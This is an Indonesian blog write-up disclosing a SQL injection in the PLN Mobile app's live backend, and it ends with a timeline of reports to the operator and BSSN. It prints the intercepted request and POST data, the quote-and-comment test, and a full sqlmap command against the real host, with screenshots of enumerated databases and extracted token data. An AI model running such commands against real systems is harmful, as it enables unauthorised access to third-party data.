---
title: SQL Injection - Application PLN Mobile
date: 2020/8/17
description: Write Up
tag: Write Up
author: You
---

![ ](https://miro.medium.com/max/600/1*nmPP_fIUsZoBn408ydemgA.jpeg)

Halo semuanya, Kali ini saya mau menulis write up sederhana yaitu Vulnerability SQL Injection di http://mobileapps.iconpln.co.id

Penemuan ini bermula dari saya melihat tagihan pembayaran listrik dirumah saya dan membuka aplikasi PLN Mobile Android.

Saya berpikir untuk melakukan intercept menggunakan Burpsuite pada aplikasi PLN Mobile. Sebelumnya saya mengkonfigurasi Burpsuite agar bisa melakukan intercept http request di aplikasi android

Pada tahap selanjutnya, saya melakukan intercept di bagian “informasi tarif listrik berlaku”

![ ](https://miro.medium.com/max/2400/1*sM-XM_wRWyRgYhCGpIMd1Q.jpeg)

Dan ini dia hasil intercept nya

![ ](https://miro.medium.com/max/2400/1*uMJRVAuaFyrchkHysB1I8A.png)

Saya mendapatkan request url dan post datanya

> Request URL: http://mobileapps.iconpln.co.id/infotdlpln
> Post Data: kel=R&produk=PASCABAYAR&serial=2676912684812711463125741116100882149710822849775988211212784127367787&versi=451&id=2676912684812711463125741116100882149710822849775988211212784127367787

___

Selanjutnya saya memeriksa di post datanya apakah vulnerable SQLI atau tidak, saya
menginjeksikan dengan single quote pada parameter “produk”. Maka response nya adalah

![ ](https://miro.medium.com/max/2400/1*FIMQa81qYPey_9Wqavtu_Q.png)

“Error 500”

___

Awalnya saya tidak yakin bahwa Vulnerable SQLI, maka saya ingin memeriksanya lagi dengan menambahkan `-- -` setelah single quote. Maka response nya adalah

![ ](https://miro.medium.com/max/2400/1*c96BFoR_gr51BsuRoJL3CQ.png)

Responsnya adalah menampilkan data-data normal.
Jika response yang muncul menampilkan data - data normal ketika menambahkan `-- -` maka bisa di pastikan vulnerable terhadap SQLI (tidak semua bisa atau pasti, tetapi mungkin saja)

___

Selanjutnya saya melakukan scan di SQLmap dengan command

```
sqlmap -u https://mobileapps.iconpln.co.id/infotdlpln --data=”kel=R&produk=PASCABAYAR&serial=2676912684812711463125 741116100882149710822849775988211212784127367787&versi=451 &id=267691268481271146312574111610088214971082284977598821 1212784127367787” --level 3 --risk 3 --dbs --threads 10
```

Maka hasil scan nya adalah

![ ](https://miro.medium.com/max/2400/1*SP5nk4I_M_2yr6TfsUk3Hg.png)

Terakhir data HPH Token Gratis

![ ](https://miro.medium.com/max/2400/1*FD8wjTLyqsVrBHyVjWF9iw.png)

TETAPI DATA TAHUN 2017 HEHE...

___

## Timeline Report

+ 27 Juli, 2020 = Send report via email humas@iconpln.co.id

+ 28 Juli, 2020 = Send report via email bantuan70@bssn.go.id

+ 8 Agustus, 2020 = Send report via email pln123@pln.co.id

Sekian write up dari saya ini, mohon maaf apabila ada salah dalam penulisan kata. jangan lupa di share yaa, agar saya semangat untuk menulis write up kembali.

Contact me at [About Me](/about/)